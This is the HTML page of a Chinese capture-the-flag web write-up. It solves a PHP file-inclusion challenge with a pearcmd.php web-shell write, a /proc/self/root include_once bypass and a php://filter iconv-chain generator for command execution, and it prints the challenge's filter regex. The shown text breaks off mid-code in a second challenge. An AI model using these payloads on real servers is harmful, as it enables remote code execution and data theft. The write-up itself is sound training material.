@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>NSS#roun8 web专项赛 - ThnPinkman’s blog</title><meta name="Description" content="只是向上走"><meta property="og:url" content="https://thnpkm.github.io/posts/ctf/nss%23roun8-web%E4%B8%93%E9%A1%B9%E8%B5%9B/">
+  <meta property="og:site_name" content="ThnPinkman’s blog">
+  <meta property="og:title" content="NSS#roun8 web专项赛">
+  <meta property="og:description" content="MyPage Where is my page？
+拿到题目就是这个样子
+感觉就是文件包含
+可以读取，可以用filter协议
+但是index.php怎么尝试都没读取到,data和input等协议都被ban了
+方法一： pearcmd.php filter读取不到index.php，可以试试pearcmd.php的姿势写shell
+index.php?&#43;config-create&#43;/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=eval($_POST[1]);?&gt;&#43;/tmp/shell.php 利用文件包含漏洞包含这个文件即可
+方法二：多级连接绕过 /proc/self/root/多级连接绕过 include_once
+?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/cwd/index.php ?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/cwd/flag.php 注意最后是proc/self/cwd/
+index.php源码是
+&lt;?php error_reporting(0); include &#39;flag.php&#39;; if(!isset($_GET[&#39;file&#39;])) { header(&#39;Location:/index.php?file=&#39;); } else { $file = $_GET[&#39;file&#39;]; if (!preg_match(&#39;/\.\.|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is&#39;, $file)) { include_once $file; } else { die(&#39;error.&#39;); } } include_once 不能重复包含,然后上面已经有include &#39;flag.php&#39; 包含了，所以读不到flag.php
+至于不能正常读到index.php我比较迷惑，应该是执行这个文件其实已经算包含一遍了，也是include_once的问题，换成include就可以正常读。
+/proc/self/root/多级连接绕过原理可参考此文
+require_once 绕过不能重复包含文件的限制方法三： PHP Base64 Filter 宽松解析 我在写这题时候 用了这个方法，不过payload生成可能产生一点问题,复现倒是很顺
+&lt;?php $base64_payload = &#34;PD89YCRfR0VUWzBdYDs7Pz4&#34;; /* &lt;?=`$_GET[0]`;;?&gt; */ $conversions = array( &#39;R&#39; =&gt; &#39;convert.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-20T23:51:36+08:00">
+    <meta property="article:modified_time" content="2024-08-20T23:51:36+08:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="NSS#roun8 web专项赛">
+  <meta name="twitter:description" content="MyPage Where is my page？
+拿到题目就是这个样子
+感觉就是文件包含
+可以读取，可以用filter协议
+但是index.php怎么尝试都没读取到,data和input等协议都被ban了
+方法一： pearcmd.php filter读取不到index.php，可以试试pearcmd.php的姿势写shell
+index.php?&#43;config-create&#43;/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=eval($_POST[1]);?&gt;&#43;/tmp/shell.php 利用文件包含漏洞包含这个文件即可
+方法二：多级连接绕过 /proc/self/root/多级连接绕过 include_once
+?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/cwd/index.php ?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/cwd/flag.php 注意最后是proc/self/cwd/
+index.php源码是
+&lt;?php error_reporting(0); include &#39;flag.php&#39;; if(!isset($_GET[&#39;file&#39;])) { header(&#39;Location:/index.php?file=&#39;); } else { $file = $_GET[&#39;file&#39;]; if (!preg_match(&#39;/\.\.|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is&#39;, $file)) { include_once $file; } else { die(&#39;error.&#39;); } } include_once 不能重复包含,然后上面已经有include &#39;flag.php&#39; 包含了，所以读不到flag.php
+至于不能正常读到index.php我比较迷惑，应该是执行这个文件其实已经算包含一遍了，也是include_once的问题，换成include就可以正常读。
+/proc/self/root/多级连接绕过原理可参考此文
+require_once 绕过不能重复包含文件的限制方法三： PHP Base64 Filter 宽松解析 我在写这题时候 用了这个方法，不过payload生成可能产生一点问题,复现倒是很顺
+&lt;?php $base64_payload = &#34;PD89YCRfR0VUWzBdYDs7Pz4&#34;; /* &lt;?=`$_GET[0]`;;?&gt; */ $conversions = array( &#39;R&#39; =&gt; &#39;convert.">
+<meta name="application-name" content="ThnPinkman&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="ThnPinkman&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://thnpkm.github.io/posts/ctf/nss%23roun8-web%E4%B8%93%E9%A1%B9%E8%B5%9B/" /><link rel="prev" href="https://thnpkm.github.io/posts/ctf/python-pth%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5getshell/" /><link rel="next" href="https://thnpkm.github.io/posts/ctf/nodejs/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "NSS#roun8 web专项赛",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/thnpkm.github.io\/posts\/ctf\/nss%23roun8-web%E4%B8%93%E9%A1%B9%E8%B5%9B\/"
+        },"genre": "posts","keywords": "","wordcount":  460 ,
+        "url": "https:\/\/thnpkm.github.io\/posts\/ctf\/nss%23roun8-web%E4%B8%93%E9%A1%B9%E8%B5%9B\/","datePublished": "2024-08-20T23:51:36+08:00","dateModified": "2024-08-20T23:51:36+08:00","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "https:\/\/thnpkm.github.io\/1651835469576.jpg"},"author": {
+                "@type": "Person",
+                "name": "Author"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">NSS#roun8 web专项赛</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-08-20">2024-08-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;460 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#mypage">MyPage</a>
+      <ul>
+        <li><a href="#方法一-pearcmdphp">方法一： pearcmd.php</a></li>
+        <li><a href="#方法二多级连接绕过">方法二：多级连接绕过</a></li>
+        <li><a href="#方法三-php-base64-filter-宽松解析">方法三： PHP Base64 Filter 宽松解析</a></li>
+      </ul>
+    </li>
+    <li><a href="#mydoor">MyDoor</a></li>
+    <li><a href="#upload_gogoggo">Upload_gogoggo</a></li>
+    <li><a href="#ez_node">ez_node</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="mypage">MyPage</h2>
+<blockquote>
+<p>Where is my page？</p>
+</blockquote>
+<!-- raw HTML omitted -->
+<p>拿到题目就是这个样子</p>
+<p>感觉就是文件包含</p>
+<!-- raw HTML omitted -->
+<p>可以读取，可以用filter协议</p>
+<p>但是index.php怎么尝试都没读取到,data和input等协议都被ban了</p>
+<h3 id="方法一-pearcmdphp">方法一： pearcmd.php</h3>
+<p>filter读取不到index.php，可以试试<code>pearcmd.php</code>的姿势写shell</p>
+<pre tabindex="0"><code>index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=eval($_POST[1]);?&gt;+/tmp/shell.php
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302111612633.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302111612633.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302111612633.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302111612633.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302111612633.png"
+        title="image-20230211161238581" /></p>
+<p>利用文件包含漏洞包含这个文件即可</p>
+<!-- raw HTML omitted -->
+<h3 id="方法二多级连接绕过">方法二：多级连接绕过</h3>
+<p><code>/proc/self/root/</code>多级连接绕过 <code>include_once</code></p>
+<pre tabindex="0"><code>?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/cwd/index.php
+</code></pre><pre tabindex="0"><code>?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/cwd/flag.php
+</code></pre><p>注意最后是<code>proc/self/cwd/</code></p>
+<p>index.php源码是</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#39;flag.php&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;file&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Location:/index.php?file=&#39;</span>);
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    $file <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;file&#39;</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/\.\.|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is&#39;</span>, $file)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">include_once</span> $file;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;error.&#39;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><code>include_once</code> 不能重复包含,然后上面已经有<code>include 'flag.php'</code> 包含了，所以读不到<code>flag.php</code></p>
+<p>至于不能正常读到index.php我比较迷惑，应该是执行这个文件其实已经算包含一遍了，也是<code>include_once</code>的问题，换成include就可以正常读。</p>
+<p><code>/proc/self/root/</code>多级连接绕过原理可参考此文</p>
+<p><a href="https://www.anquanke.com/post/id/213235#:~:text=%E6%89%80%E4%BB%A5%E4%B8%80%E5%A4%A7%E5%A0%86%20%2Fproc%2Fself%2Froot%20%E6%8B%BC%E4%B8%80%E8%B5%B7%EF%BC%8C%E4%BB%8E%E5%90%8E%E5%BE%80%E5%89%8D%E5%80%92%EF%BC%8C%E9%80%92%E5%BD%92%E8%B0%83%E7%94%A8%20tsrm_real_path_r%20%EF%BC%8C%E7%9B%B4%E5%88%B0%20php_sys_lstat%20%E8%BF%94%E5%9B%9E%200,%2Fproc%2Fself%20%E6%98%AF%E4%B8%AA%E7%AC%A6%E5%8F%B7%E9%93%BE%E6%8E%A5%E6%8C%87%E5%90%91%E5%BD%93%E5%89%8D%E8%BF%9B%E7%A8%8B%20pid%20%EF%BC%8C%20self%20%E5%BA%95%E4%B8%8B%E7%9A%84%20root%20%E4%B9%9F%E6%98%AF%E4%B8%AA%E7%AC%A6%E5%8F%B7%E9%93%BE%E6%8E%A5%EF%BC%8C%E6%89%80%E4%BB%A5%E7%AE%97%E4%B8%8B%EF%BC%8C%E4%B9%9F%E6%98%AF41%E4%B8%AA%EF%BC%8C%E6%AD%A3%E6%AD%A3%E5%A5%BD%E5%90%A7%EF%BC%9F" target="_blank" rel="noopener noreffer">require_once 绕过不能重复包含文件的限制</a>
+</p>
+<h3 id="方法三-php-base64-filter-宽松解析">方法三： PHP Base64 Filter 宽松解析</h3>
+<p>我在写这题时候 用了这个方法，不过payload生成可能产生一点问题,复现倒是很顺</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>$base64_payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;PD89YCRfR0VUWzBdYDs7Pz4&#34;</span>; <span style="color:#75715e">/* &lt;?=`$_GET[0]`;;?&gt; */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$conversions <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;R&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;B&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;C&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;convert.iconv.UTF8.CSISO2022KR&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;8&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;9&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;f&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;s&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;z&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;U&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;P&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;V&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;0&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Y&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;W&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;d&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;D&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;7&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;4&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#39;</span>
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$filters <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;convert.base64-encode|&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$filters <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;convert.iconv.UTF8.UTF7|&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">foreach</span> (<span style="color:#a6e22e">str_split</span>(<span style="color:#a6e22e">strrev</span>($base64_payload)) <span style="color:#66d9ef">as</span> $c) {
+</span></span><span style="display:flex;"><span>    $filters <span style="color:#f92672">.=</span> $conversions[$c] <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;|&#34;</span>;
+</span></span><span style="display:flex;"><span>    $filters <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;convert.base64-decode|&#34;</span>;
+</span></span><span style="display:flex;"><span>    $filters <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;convert.base64-encode|&#34;</span>;
+</span></span><span style="display:flex;"><span>    $filters <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;convert.iconv.UTF8.UTF7|&#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>$filters <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;convert.base64-decode&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$final_payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;php://filter/</span><span style="color:#e6db74">{</span>$filters<span style="color:#e6db74">}</span><span style="color:#e6db74">/resource=/etc/passwd&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> $final_payload;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#var_dump(file_get_contents($final_payload));
+</span></span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302131952782.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302131952782.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302131952782.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302131952782.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302131952782.png"
+        title="image-20230213195251697" /></p>
+<h2 id="mydoor">MyDoor</h2>
+<blockquote>
+<p>一个普通的后门。</p>
+</blockquote>
+<p>这题的初始页面与上题一模一样</p>
+<p>不一样的是可以直接伪协议读取到index.php (没用include_once)</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302111352228.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302111352228.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302111352228.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302111352228.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302111352228.png"
+        title="image-20230211135232815" /></p>
+<p>能filter伪协议读取到index.php的源码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
